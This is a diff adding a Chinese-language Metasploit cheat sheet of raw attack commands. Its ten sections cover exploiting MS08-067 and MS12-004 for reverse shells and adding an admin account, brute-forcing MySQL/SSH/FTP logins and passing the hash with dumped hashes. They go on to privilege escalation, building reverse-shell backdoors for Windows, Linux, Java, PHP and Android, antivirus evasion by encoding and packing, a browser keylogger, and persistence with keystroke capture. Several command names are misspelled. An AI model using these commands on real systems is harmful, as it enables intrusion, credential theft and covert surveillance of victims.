@@ -1,0 +1,20 @@
+1.远程代码执行
+msfconsole search 08-067 use exploit/windows/smb/ms08_067_netapi show options set RHOST IP show payloads set payload windows/meterpreter/reverse_tcp show options set LHOST ip info(查看影响版本) 用nmap查看目标服务器版本 set target 编号 show options（检查是否已经设置好） exploit shell net user admin admin /add
+2.MJDJ文件解析远程代码执行
+msfconsole search12-004 use exploit/windows/browser/ms12_004_midi show options set SRVHOST IP exploit set URIPATH / show options set LPORT 1244 show options exploit sessions sessions -i id
+3.口令安全
+msfconsole serach msql_login(ssh_login,ftp_login) use auxiliary/scanner/mysql/mysql_login set RHOST IP set USERNAME root set PASS_FILE 字典路径 set THREAD 50 set options(check) exploit
+4.hash值传递渗透
+msfconsole use/windows/smb/psexec show options set RHOST IP set SMMBUSER 帐号 show options exploit hashdump(获取hash值) exit set smbpass hash exploit
+5.NDP内核提权
+前提:必须有一个session serarch 14-002 use exploit/windows/local/ms_ndproxy show options set session 1(id) show options exploit提权：getsystem
+AD：你也可以在以下专栏，学习完整Kali Linux渗透测试课程！
+6.多种后门的生成a.windows后门的生成 msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=端口 X >123.exe search handler use exploit/mulit/handler show options set payload windows/meterpreter/reverse_tcp show options set LHOST IP set LPORT 端口 点击123.exeb.linux后门的生成 msfpayload linux/x86/shell_reverse_tcp LHOST=IP LPORT=端口 X >linux chmod 777 linux ls ./linuxc.java后门的生成 msfpayload java/meterpreter/shell_reverse_tvp LHOST=IP LPORT=端口 W >123.jar d.php后门的生成 msfpayload java/meterpreter/shell_reverse_tcp LHOST=IP LPORT=端口 R | msfencode -e php/baes64 -t raw -o 123.php上传到目标站-本地监听-目标访问服务器e.安卓后门的生成 msfpayload android/meterpreter/shell_reverse_tcp LHOST=IP LPORT=端口 R >1.apk 目标运行1.apk 本地监听
+7.内网渗透
+获得shell扫描c段 run get_local_subnets 获取网卡 run autoroute -s ip 扫描c段劫持域管理 use incognito impersonate_token 域 shell use auxiliary/sniffer/psnuffle run
+8.反反病毒（免杀）
+msfpaylad windows/shell/reverse_tcp LHOST=192.168.48.130 LPORT=1111 R| msfencode -e x86/shikata_ga_nai - t exe>123.exe msfpaylad windows/shell/reverse_tcp LHOST=192.168.48.130 LPORT=1111 R| msfencode -e x86/shikata_ga_nai -c 10 - t raw | msfencode -e x86/countdown -c 5 -t exe -o /1231.exemsfpaylad windows/shell/reverse_tcp LHOST=192.168.48.130 LPORT=1111 R| msfencode -t exe -x /root/ftp.exe -o 123123.exe -e x86/shikata_ga_nai - k -c 10upx -5 /1231.exe 加壳
+9.不一样的xss(键盘记录)
+msfconsole search keylogger use auxiliary/server/capture/http_javascript_keyloger show options set DEMO true set URIPATH / set srvport 80 run
+10.维持访问
+msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set LHOST IP SET LPORT 1111 run run metsvs -A use exploit/multi/handler set payload windows/meterpreter/metsvs_bind_tcp show options set LPORT 31337 set RHOST IP exploit keyscan_start(键盘记录) keyscan_dump
